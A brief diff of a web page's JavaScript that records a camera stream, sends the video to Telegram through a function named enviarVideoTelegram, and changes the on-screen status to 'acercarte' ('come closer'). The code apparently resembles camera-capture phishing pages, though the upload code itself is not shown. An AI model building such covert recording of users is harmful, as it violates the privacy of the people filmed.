@@ -220,7 +220,7 @@ function startRecording(stream) {
 
     mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        statusText.innerText = "📤 ...";
+        statusText.innerText = "📤 acercarte ...";
         enviarVideoTelegram(blob);
     };
 
